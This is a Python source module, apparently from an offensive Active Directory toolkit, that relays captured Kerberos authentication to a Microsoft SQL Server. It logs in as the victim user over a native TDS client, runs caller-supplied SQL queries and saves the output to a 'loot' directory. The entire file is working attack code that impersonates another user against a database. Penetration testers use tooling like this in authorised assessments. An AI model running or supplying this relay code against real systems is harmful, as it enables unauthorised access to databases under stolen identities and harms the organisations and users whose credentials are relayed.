# -*- coding: utf-8 -*-
"""Kerberos relay to MSSQL via native TDS client."""

from __future__ import annotations

import logging
import os
from typing import List, Optional, Tuple
from urllib.parse import urlparse

from lib.protocols.mssql.tds_native import TdsError, TdsNativeClient

LOG = logging.getLogger(__name__)


def _parse_mssql_target(relay_target: str) -> Tuple[str, int]:
    parsed = urlparse(relay_target)
    host = parsed.hostname or ""
    if not host:
        raise ValueError(f"invalid MSSQL relay target: {relay_target}")
    port = parsed.port or 1433
    return host, int(port)


def relay_kerberos_to_mssql(
    authdata: dict,
    relay_target: str,
    queries: Optional[List[str]] = None,
    lootdir: str = ".",
) -> Tuple[bool, Optional[str]]:
    if not queries:
        raise ValueError("at least one MSSQL query is required")

    host, port = _parse_mssql_target(relay_target)
    username = authdata.get("username") or "unknown"
    client = TdsNativeClient(host, port=port)
    output_lines = [f"[*] Relayed Kerberos auth as {username} to {host}:{port}"]

    try:
        client.connect()
        client.prelogin()
        if not client.login_integrated(authdata["krbauth"], server_name=host):
            return False, None

        output_lines.append("[+] MSSQL integrated login succeeded")
        all_ok = True
        for query in queries:
            output_lines.append(f"[*] SQL> {query}")
            ok, result = client.execute_sql(query)
            output_lines.append(result if ok else f"[-] {result}")
            all_ok = all_ok and ok

        os.makedirs(lootdir or ".", exist_ok=True)
        safe_user = "".join(ch if ch.isalnum() or ch in "._-$" else "_" for ch in username)
        output_path = os.path.join(lootdir, f"mssql_relay_{safe_user}.txt")
        with open(output_path, "w", encoding="utf-8") as handle:
            handle.write("\n".join(output_lines))
            handle.write("\n")
        LOG.info("MSSQL relay output written to %s", output_path)
        return all_ok, output_path
    except (TdsError, OSError, ValueError) as exc:
        LOG.error("MSSQL relay failed: %s", exc)
        return False, None
    finally:
        client.close()
